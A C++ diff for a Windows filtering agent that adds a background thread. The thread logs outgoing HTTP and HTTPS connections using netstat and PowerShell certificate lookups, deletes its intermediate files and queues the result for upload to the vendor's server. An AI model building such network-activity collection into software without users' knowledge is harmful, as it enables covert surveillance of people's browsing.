@@ -12,7 +12,7 @@ DWORD WINAPI initFiltering(LPVOID lpParam)
 
 		while (TRUE) {
 			deviceConfigs = downloadFile(CONFIGURATION);
-		
+
 			if (deviceConfigs.dwStatusCode != 200 || deviceConfigs.response == "[]")
 				Sleep(SYNC_TIME);
 			else
@@ -45,6 +45,43 @@ DWORD WINAPI initFiltering(LPVOID lpParam)
 						setFilters(finalFilterPath.c_str(), additionalSites);
 						Sleep(SYNC_TIME * 60);
 					}
+		Sleep(SYNC_TIME);
+	}
+	return 0;
+}
+
+DWORD WINAPI initNetLogger(LPVOID lpParam)
+{
+	while (TRUE) {
+		// Get a new filename
+		wstring firstfilename = stringToWString(DATA_FOLDER_PATH).append(L"netlog");
+		// First create a list of ip outgoing addresses on port 443 (HTTPS) and 80 (HTTP)
+		LPCWSTR netSnifferCmd = L"for /f \"tokens=3\" %a in ('netstat -p tcp -n -o') do @echo %a | findstr /c:\":443\" /c:\":80\"";
+		runCommand(netSnifferCmd, firstfilename.c_str());
+
+		wstring secondFilename = stringToWString(constructFilename(TEMP_CODE));
+		// Try to parse the list and pass each ip through a function to retireve the certificate.
+		// This allow us to find the ownership of the domain
+		LPCWSTR listParser = L"powershell -command \"Import-module .\\scripts\\getCertId.ps1 -Force | .\\scripts\\parseList.ps1\"";
+		runCommand(listParser, secondFilename.c_str());
+
+		// After the parsing the original list is no longer needed since we have a new list
+		DeleteFile(firstfilename.c_str());
+
+		// Sort lines of last file and remove duplicates  
+		wstring rDuplicates = L"powershell -command \"Get-Content " + secondFilename + L" | Sort-Object -Unique | Get-Unique\"";
+		runCommand(rDuplicates.c_str(), firstfilename.c_str());
+		
+		// Delete the old file
+		DeleteFile(secondFilename.c_str());
+
+		wstring filenameFinal = stringToWString(constructFilename(NETLOG_CODE));
+		// change the name to send it to our server..
+		if (!rename(wStringToString(firstfilename).c_str(), wStringToString(filenameFinal).c_str()))
+		{
+			// Notifiy data manager thread 
+			SetEvent(newDataEvent);
+		}
 		Sleep(SYNC_TIME);
 	}
 	return 0;
